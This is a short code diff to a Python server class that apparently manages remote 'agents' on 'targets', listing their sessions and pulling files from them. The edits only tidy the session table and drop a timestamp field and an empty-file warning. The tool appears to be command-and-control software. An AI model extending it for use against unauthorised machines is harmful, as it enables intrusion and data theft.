@@ -161,7 +161,6 @@ class Server:
         agent.user = json_object['user']
         agent.mac = json_object['mac']
         agent.uid = json_object['uid']
-        agent.timestamp = json_object['timestamp']
         agent.os = json_object['os']
 
     def accept_connections(self):
@@ -236,8 +235,6 @@ class Server:
                 while True:
                     data = self.current_agent.sock.recv(DATA_CHUNK_SIZE)
                     if data == SIG_EOF or not data:
-                        if file_length == 0:
-                            print(f"WARNING: {file_path} is empty")
                         break
                     if data == FILE_NOT_FOUND:
                         print(f"ERROR: {file_path} not found on the target.")
@@ -348,7 +345,7 @@ class Server:
             print(f"{'ID':<5}{'Connection':<23}{'Session':<25}{'Uptime':<15}{'OS'}")
             print("-" * 80)
             for agent in self.agents:
-                print(f"{agent.id:<5}{agent.ip:}:{agent.port:<10}{agent.user}@{agent.hostname:<19}{self.get_agent_uptime(agent):<15}{agent.os}")
+                print(f"{agent.id:<5}{agent.ip + ':' + str(agent.port):<23}{agent.user + '@' + agent.hostname:<25}{self.get_agent_uptime(agent):<15}{agent.os}")
             print("=" * 80)
             print("")
         else:
